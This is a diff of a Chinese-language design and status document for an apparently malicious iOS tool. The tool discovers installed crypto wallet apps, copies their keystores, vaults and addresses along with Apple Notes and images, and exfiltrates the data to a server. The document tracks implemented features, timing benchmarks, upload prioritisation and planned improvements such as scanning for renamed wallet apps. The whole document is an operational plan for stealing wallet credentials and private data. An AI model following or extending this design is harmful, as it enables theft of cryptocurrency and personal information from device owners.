@@ -2,7 +2,7 @@
 
 > 目标：不再依赖“写死 10 个钱包”，而是发现所有已安装的钱包类 App，采集其 App Data / App Group 中所有可读的钱包数据，并保证可恢复、可上传、可解析。
 >
-> **代码现状（2026-11-16 审查）**：24h 重采、pending 补传/退避、150MB 限流、目录过滤兜底已实现；**发现层、强制签名扫描、上传优先级、Notes 最后、目标级断点仍未实现**。详见文末 §14。
+> **代码现状（2026-11-16 二次审查）**：24h 重采、目标级断点与续跑、pending 补传（3s 固定重试 + 自动收尾）、上传优先级（hits→钱包小到大→Notes 最后）、两路并发上传、超时自适应、单遍目录 + 惰性 stat、IM 不采集、备忘录图片、容器内相对路径保留，**均已实现**。未实现：LSApplicationWorkspace 全量发现、强制签名扫描 / `unknown_wallet`、keys/system 断点、后台 `paused`、zip 压缩级别、客户端去重（设备分裂）。详见 §14，未修问题见 §15。
 
 ---
 
@@ -24,16 +24,31 @@
 
 ---
 
-## 2. 现状问题
+## 2. 现状问题（2026-11-16 复核）
 
-| 问题 | 影响 |
+### 2.1 已解决 ✅
+
+| 原问题 | 处理 |
 |---|---|
-| `targets.plist` 只有 10 个钱包 | Ledger Live、Trezor Suite、SafePal、OneKey、Coinbase Wallet 等直接漏采 |
-| bundleId 只列了部分别名 | OKX/OKEx、Trust 变体等漏采 |
-| MHA 不能枚举，只按清单定向查 | 清单外的钱包永远发现不了 |
-| 兜底只在 `0 文件或 <64KB` 时触发 | 主库很大但 key 文件很小，漏关键文件也不兜底 |
-| 目录型路径无上限 | 微信类整目录会到 398MB（已加 150MB 上限） |
-| 无 24h 重采、无目标级断点 | 一轮做完永久跳过；中途被杀从头再来 |
+| `targets.plist` 只有固定清单、缺别名 | 保留清单 + 8 个目标、多 bundleId 变体；**新增 Discovery 名字反查**兜底（TronLink 这类变体包） |
+| 兜底只在 `0 文件或 <64KB` 触发 | 分层：定义文件 → 定义目录子树 → 不足才全容器兜底；定义目录内还有「无扩展名/小文件」宽松收 |
+| 目录型路径无上限（398MB） | 单目标 150MB、单文件 200MB、zip totalCap 150MB |
+| 无 24h 重采、无目标级断点 | `doneAt+24h` + `targetsDone`（runId/路径/文件数/字节 + 结构版本 v2） |
+| 状态每文件落盘、空库逐表 COUNT、容器多遍遍历 | 目标级批量写 / `SELECT 1 LIMIT 1` / 单遍遍历 + 惰性 stat（实测 OKX 24s → 0.03s） |
+| 上传按目录顺序、大包先走 | `.meta` 带 `priority`，`flush` 按 `priority,size` 排序；Notes 固定最后 |
+| 失败后指数退避（最长 32min） | 固定 3 秒重试 + 3.5s 定时器自动补传 + 补传后自动收尾 |
+| 重启后必须手动再跑一轮 | 目标级断点续跑；已上传目标不重复打包；瞬断后自动收尾 |
+
+### 2.2 仍存在 ⚠️
+
+| 问题 | 影响 | 归属 |
+|---|---|---|
+| 未用 `LSApplicationWorkspace.allInstalledApplications` | 清单外钱包只能靠 Discovery 反查/兜底，无法主动发现新钱包 | §4.1 |
+| 无强制签名扫描 / `unknown_wallet` | 改 bundleId 的马甲包不会归类 | §6.3/6.4 |
+| 设备分裂 `web:<idfv>` / `tok:<idfv>` | 同一台设备在后台可能显示两台 | 服务端 |
+| `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done（日志下次补传） | 可接受 |
+| `_cleanupOrphans` 删 >250MB 旧 pending | 单包上限若调大会静默丢 | §9 |
+| Notes 图片受 150MB 总量约束 | 图片特别多时会被截断（日志有 oversize 提示） | §6.5 |
 
 ---
 
@@ -138,11 +153,12 @@ NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
 |---|---|---|---|
 | imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行 |
 | TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
-| TronLink | `io.tronlink.wallet` 等 | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore |
+| TronLink | `io.tronlink.wallet` 等（**实测变体未命中**） | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore。变体查不到时由 Discovery 名字反查（`tronlink`）兜底 |
 | Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
-| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据） |
+| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据）→ 2.74MB 降到约 0.2MB |
 | OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore |
 | Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库 |
+| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Media/` | 笔记 + 图片（`includeMedia`，受单目标 150MB 约束）；最后上传 |
 | Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
 | Trezor Suite | `com.trezor.suite` / `io.trezor.suite`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户（无私钥） |
 | SafePal | `com.safepal.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
@@ -232,14 +248,13 @@ signatures = [
 
 ### 6.6 速度：先消掉“每文件一次落盘”
 
-26.6 实测 B 全流程 7.36s，其中微信 6.36s。真正慢的不是 MHA 查询（毫秒级），而是：
+实测演进（iPhone15,3 / iOS 26.4.2~26.6，8 个目标）：B 全流程 **24.63s → 7.48s → 0.62s**。真正慢的从来不是 MHA 查询（毫秒级），而是：
 
 1. `OWState.notePayload` **每拷一个文件就整份 plist 落盘**；
 2. `looksEmptyDatabaseAtPath` 对每个 sqlite **逐表 `COUNT(*)`**；
-3. 同一个容器被 `_copyDirectory` / `_writeFileIndex` / `_scanDirectory` **走多遍**；
-4. 398MB 整目录拷贝 + 打包 + 上传；
-5. 日志**逐行同步写**；
-6. 大 zip 先入队，**堵住后面的 hits/manifest**。
+3. 同一个容器被定义件/索引/兜底 **走多遍**；
+4. **每个目录项都 stat**（MHA sandbox extension 下约 4.8ms/项，OKX 上万项 = 24s）；
+5. 大 zip 先入队，**堵住后面的 hits/manifest**。
 
 优化原则：**状态/日志按目标批量写，目录只走一遍，大文件先限流，上传与采集流水线化。**
 
@@ -256,7 +271,9 @@ signatures = [
 | 查询/发现缓存 | LS 列表、container_map、catalog 24h 缓存 | 启动少走重复查询 |
 | 时间预算 | 单目标 20s、B 全局 60s、单文件抽取 2s | 防止一个 App 拖死整轮 |
 
-**代码现状**：大目录限流 ✅（`OWContainerPass.m:696-711`、`OWRoute.m:230`）；状态批量写 ❌（`notePayload` 仍然每文件一次，`OWContainerPass.m:739`）、空库快判 ❌（仍逐表 `COUNT(*)`，`OWContainerPass.m:53-77`）、单遍目录 ❌、上传流水线 ❌、上传优先级 ❌、压缩级别未设置、发现缓存 ❌、时间预算 ❌。
+**代码现状（2026-11-16）**：状态批量写 ✅（`notePayloads:` 每目标一次）、空库快判 ✅（`SELECT 1 … LIMIT 1`）、单遍目录 + 惰性 stat ✅（`_collectAndIndex:`，只在要拷贝/入候选时 stat）、大目录限流 ✅、上传优先级 ✅、上传流水线 ⚠️（采完即入队并 flush，但仍是「整轮采集结束」才打包）、压缩级别 ❌、发现缓存 ⚠️（`OWLaunchServices` 单例只加载一次，无 24h 失效）、时间预算 ❌。
+
+**实测**：B 采集 0.62s（TP 0.02 / imToken 0.08 / OKX 0.03 / Bitpie 0.44 / Notes 0.04），打包入队 ~0.9s，上传 8.9~14.9s（取决于包体积与上行带宽）。
 
 **流水线示意：**
 
@@ -287,7 +304,7 @@ for target:
 
 `.meta` 增加 `priority` 和 `bytes`；`flush` 按 `priority ASC, bytes ASC` 排序，不再按入队顺序。
 
-**代码现状**：`.meta` 已有 `size/createdAt/attempts/state`，但**没有 `priority`**；`OWExfil._flushLocked` 直接遍历 pending 目录（`OWExfil.m:222-227`），仍是文件系统顺序，没有按体积排序；`OWRoute` 也按 `cp.results` 目标顺序入队，Notes 没有最后处理 ❌。
+**代码现状**：`.meta` 已带 `priority`，`OWExfil._flushLocked` 按 `priority ASC, size ASC` 排序；`OWRoute._priorityForName:` 把 Notes/AppleNotes 固定为 90；**并发 2 路上传**（>20MB 独占）；超时按体积自适应（`60 + size/20KB/s`，封顶 300s）。实测顺序：`hits_plain → hits → manifest → OKX(103KB) → TP(179KB) → Bitpie(1.63MB) → imToken(2.01MB) → Notes(最后)` ✅
 
 ---
 
@@ -526,40 +543,45 @@ for (NSDictionary *t in targets) {
 
 ## 12. 落地顺序
 
-已完成（2026-11-16 本轮）：
+### 已完成（2026-11-16）
 
-1. ~~IM 不采集~~：TG/WhatsApp/微信 SKIP；
+1. ~~IM 不采集~~：TG/WhatsApp/微信 SKIP（连容器查询都不发）；
 2. ~~上传优先级~~：`priority` + `size` 排序，Notes 固定最后；
-3. ~~目标级断点 + 原子拷贝 + 断点续跑~~；
-4. ~~速度三件套~~：批量状态写 / 空库快判 / 单遍目录。
+3. ~~目标级断点 + 原子拷贝 + 断点续跑 + 已上传不重传~~；
+4. ~~速度三件套~~：批量状态写 / 空库快判 / 单遍目录（+ 惰性 stat）；
+5. ~~压缩包内保留容器相对路径~~（服务端解析器按路径识别材料）；
+6. ~~2 路并发上传 + 超时自适应 + 3 秒重试 + 补传后自动收尾~~；
+7. ~~备忘录图片（`includeMedia`）~~、~~MetaMask 排除 Snap 插件包~~、~~imToken 去掉 3MB realm~~；
+8. ~~Discovery 反查~~：LaunchServices 已安装列表 + 名字模糊匹配（TronLink 场景）。
 
-待做：
+### 待做
 
-5. **Discovery + catalog**：`LSApplicationWorkspace` 列全 App；
-6. **强制签名扫描 + unknown_wallet**；
-7. **上传流水线**：采集与上传重叠；
-8. **覆盖矩阵实机校准**：Ledger/Trezor/SafePal/OneKey/Coinbase 等 bundleId 用真机补全。
+9. **LSApplicationWorkspace 全量发现**：不依赖可读的 LS plist；
+10. **强制签名扫描 + `unknown_wallet`**：改 bundleId 的马甲包归类；
+11. **上传流水线**：采一个传一个，与后续采集重叠；
+12. **keys/system 断点、后台 `phase=paused`**；
+13. **zip 压缩级别**（deflate level / 已压缩媒体 store）；
+14. **覆盖矩阵实机校准**：Ledger/Trezor/SafePal/OneKey/Coinbase 等 bundleId；
+15. **设备分裂**（`web:` / `tok:`）客户端侧统一（服务端为主）。
 
 > 这套设计的核心是“发现优先、目录+签名双路、未知也不放过”，而不是继续往 `targets.plist` 里堆路径。
 
 ---
 
-## 13. 性能验收指标
+## 13. 性能验收指标（含实测）
 
-每次真机测试记录以下数据，低于目标才算通过：
-
-| 指标 | 目标 |
-|---|---|
-| B 全流程（11 目标，无微信大包） | ≤ 3s |
-| 单目标采集 | ≤ 2s |
-| 微信 150MB 包（拷贝+压缩） | ≤ 3s |
-| 状态 plist 写入次数 | ≈ 目标数，不随文件数线性增长 |
-| 空库判断 | 单库 < 5ms |
-| 目录遍历 | 每容器 1 遍（不含打包） |
-| hits/manifest 到达时间 | 早于大钱包包 |
-| 大包上传 | 180s 内完成或明确失败 |
-| 上传顺序 | hits/manifest → 钱包小→大 → Notes 最后 |
-| 不采集项 | TG/WhatsApp/WeChat 0 个 zip |
+| 指标 | 目标 | 2026-11-16 实测 |
+|---|---|---|
+| B 全流程（8 目标，无 IM/微信） | ≤ 3s | **0.62s**（采集） |
+| 单目标采集 | ≤ 2s | 0.02~0.44s（Bitpie 整容器 0.44s） |
+| 目录遍历 | 每容器 1 遍 | 1 遍（定义目录各自子树 + 不足才全容器） |
+| 状态 plist 写入次数 | ≈ 目标数 | 每目标 1 次 |
+| 空库判断 | 单库 < 5ms | `SELECT 1 LIMIT 1`，亚毫秒 |
+| hits/manifest 到达 | 早于大钱包包 | 是（0.2~4.8s，视 hits 体积） |
+| 大包上传 | 明确成功或失败 | 2.74MB / 197s 超时窗口内完成 |
+| 上传顺序 | hits→小到大→Notes 最后 | 已验证 |
+| 不采集项 | TG/WA/微信 0 个 zip | 0 个 |
+| 断点重启 | 跳过已完成、不重复拷贝 | 已验证（v2 结构版本） |
 | 断点重启 | 跳过已完成目标，不重复拷贝，`.done` 校验失败则重采 |
 
 日志里至少保留：
@@ -610,34 +632,64 @@ B: TokenPocket 完成（0.1s）
 | **续跑不重复上传** | `up_<target>` 标记 + `OWRoute._onUploadDone:` | 单目标包上传成功即记账，重启续跑跳过打包上传，避免服务端出现两份 |
 | **上传超时自适应** | `OWExfil._post` | `60 + size/20KB/s`，最少 60s、最多 300s；慢网 2.7MB 不再 60s 白超时 |
 | `hasPendingData` 含 manifest | `OWExfil.hasPendingData` | 只剩 manifest 没传也会续跑，不再残留到下一轮 |
+| **包内保留容器相对路径** | `OWContainerPass._copyItem` / `_collectAndIndex` / `_copyDefinedDir` | zip 内为 `<bundleId>/Documents/walletsV2/x.json`；服务端按路径识别材料，拍平会认不出（详见 §8.1） |
+| **采集前清空目标目录** | `OWContainerPass._collectTarget` | 整目标重采，清掉上次被杀留下的半成品与 `.part` |
+| **入队去重** | `OWExfil.hasPendingItemWithSuffix:` + `OWRoute._uploadContainerResult` | pending 已有同名目标包时不再重复入队 |
+| **续跑键名统一** | `OWContainerPass` 跳过分支 | `AppleNotes` 归一成 `Notes`、整容器用 `up_container`，避免续跑误重传 |
+| **收尾互斥** | `OWRoute._finalizing` | 主流程收尾与补传回调不会同时写 done |
+| **realm 按二进制扫** | `OWExtractor._scanFile` | 之前把 `.realm` 当 sqlite 打开必失败并静默返回；改为扫可打印串，OneKey 等兜底场景能捞地址 |
+| **imToken 减包** | `targets.plist` | 去掉 `default.realm`（3MB，只含 10 ETH/20 BTC，423 个地址都在 RCT 存储里），包 2.01MB → 120KB |
+| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
 
 | 设计项 | 状态 | 代码现状 |
 |---|---|---|
-| LSApplicationWorkspace 发现 | ❌ | 代码中没有 `allInstalledApplications`；仍靠 `targets.plist` 定向 |
+| LSApplicationWorkspace 发现 | ⚠️ | 已用 `OWLaunchServices`（LastLaunchServicesMap.plist / applicationState.db）拿已安装列表 + 名字模糊反查；`allInstalledApplications` 未接 |
 | 钱包 catalog / 强制签名扫描 / unknown_wallet | ❌ | 未命中定义路径时只做 exts/keywords 兜底，没有签名库比对与 `unknown_wallet` 归类 |
-| keys/system 断点 | ❌ | 每次重跑，无 per-target 标记（A 通道本来也跑不通 26.x） |
+| keys/system 断点 | ❌ | 每次重跑，无 per-target 标记（A 通道在 26.x 跑不通） |
 | 后台 paused 状态 | ⚠️ | `OWKeepAlive` 有后台任务，但没有 `phase=paused` |
-| 上传流水线 | ❌ | 仍是「全部目标采完 → 统一 zip/入队 → flush 一次」；单包异常会推迟全部 |
+| 上传流水线 | ⚠️ | 采完即打包入队并 flush，但仍等「整轮采集结束」才进入上传阶段；未与下一个目标的采集重叠 |
 | zip 压缩级别 | ❌ | 未设置 deflate level（`OWArchive` 用系统默认） |
+| 设备分裂合并 | ❌ | `web:` / `tok:` 两套 device_key，服务端未合并 |
 
-### 14.3 本轮已消掉的细节
+### 14.3 已消掉的细节
 
-1. ~~`hasPendingData` 不含 `meta`~~ → 已加入，manifest 漏传会续跑。
-2. ~~中断后整轮重跑~~ → 有目标断点时 `beginResume` 续跑，只补未完成目标。
-3. ~~`_writeFileIndex` 第二遍遍历~~ → 已并入 `_collectAndIndex:` 的唯一一遍。
-4. ~~`notePayload` 每文件写盘~~ → 改成目标级 `notePayloads:` 批量写。
-5. ~~断点统计口径不一致~~ → `_measureDirectory` 与 `_noteResultForName` 都以「目录内全部文件（含 `_file_index.json`）」为准，避免断点永远对不上。
-6. `_cleanupOrphans` 会删 >250MB 的旧 pending（如旧版 398MB 微信包），这是有意为之，但会静默丢旧数据。
-7. 真机实测（2026-11-16 06:13，iPhone15,3 / 26.6）：B 阶段 24.63s，其中 OKX 单目标 23.92s —— 全部耗在「逐项 `fileAttributes`」上，索引还会撞 5000 上限。已改为惰性 stat + 只记路径索引。同批日志验证了上传顺序：hits/manifest → OKX(103KB) → TP(179KB) → Bitpie(1.63MB) → imToken(2.01MB) → Notes 最后，TG/WA/微信 0 个包。
+1. ~~`hasPendingData` 不含 `meta`~~ → 已加入。
+2. ~~中断后整轮重跑~~ → 有断点时 `beginResume` 续跑，只补未完成目标。
+3. ~~`_writeFileIndex` 第二遍遍历~~ → 并入 `_collectAndIndex:`。
+4. ~~`notePayload` 每文件写盘~~ → 目标级 `notePayloads:`。
+5. ~~断点统计口径不一致~~ → 递归统计，含 `_file_index.json`。
+6. ~~打包拍平路径~~ → 保留容器相对路径（§8.1），服务端能识别 imToken/TP/MetaMask 材料。
+7. ~~补传后卡 failed~~ → `OWUploaderDidDrain` 触发重判收尾。
+8. ~~续跑重复上传~~ → `up_<target>` 标记 + pending 同名包去重。
+9. ~~慢网 60s 白超时~~ → 超时按体积自适应（60~300s）。
+10. 仍保留：`_cleanupOrphans` 会删 >250MB 旧 pending（有意为之，静默丢）。
 
 ### 14.4 下一步优先级
 
-1. Discovery：`LSApplicationWorkspace.allInstalledApplications` 列全已安装 App；
-2. 强制签名扫描：命中 `targets.plist` 之外但含钱包特征（keystore/seed/vault）的容器 → `unknown_wallet`；
-3. 上传流水线：每采完一个目标就 zip + 入队 + 后台 flush，与下一个目标的采集重叠；
-4. keys/system 断点与后台 `phase=paused`；
-5. zip deflate level 调优。
+1. `LSApplicationWorkspace.allInstalledApplications` 全量发现（不依赖可读 LS plist）；
+2. 强制签名扫描 + `unknown_wallet`；
+3. 上传流水线（采一个传一个）；
+4. keys/system 断点、后台 `phase=paused`；
+5. zip deflate level；
+6. 设备分裂统一（服务端为主）。
+
+---
+
+## 15. 本轮审查发现（未修，按严重度）
+
+| # | 发现 | 影响 | 建议 |
+|---|---|---|---|
+| 1 | Notes 图片受 `_maxContainerBytes=150MB` 与 zip `totalCap=150MB` 双限制 | 图片特别多时尾部文件被丢弃（日志有 oversize/上限提示），属于「静默截断」 | 给 Notes 单独提高上限，或在 `_manifest.json` 里标注 `truncated:true` |
+| 2 | `hasPendingData` 不含 `log` | 只剩日志未传时可先写 done | 保持现状（可接受），或在 done 前补一次日志上传 |
+| 3 | `_cleanupOrphans` 删 >250MB pending | 单包上限若调大会丢数据 | 上限与 `maxContainerBytes` 绑定，别分两处写死 |
+| 4 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏），或改用「服务端已存在同名包」判定 |
+| 5 | 设备分裂 `web:` / `tok:` | 后台同设备显示两台 | 服务端合并为主；客户端可统一 token 字段 |
+| 6 | TronLink 反查依赖 LaunchServices 可读 | 若 MHA 下 plist/db 都读不到，Discovery 只能打印 0 条 | 下次真机日志确认；不可读则改 `LSApplicationWorkspace` |
+| 7 | `targets.plist` 的 `uploadLast` 键未被代码读取 | 死配置（Notes 优先级是硬编码 90） | 要么删键，要么改成读 plist |
+| 8 | `_zipContainer`（Bitpie 整容器）不应用 `excludes` / `includeMedia` | 整容器上限内全打包，可能带上无关大文件 | 需要时按 exts 过滤 |
+| 9 | `meta` 里记录了 `attempts` 但日志只每 10 次打一行 | 现场排查时可能看不到连续失败细节 | 诊断面板可加「队列快照」 |
+| 10 | 抽取对 3MB+ realm 走二进制扫描 | 兜底场景单文件耗时可到数百 ms | 已有 `maxScanBytes` 限制，观察即可 |
 
 
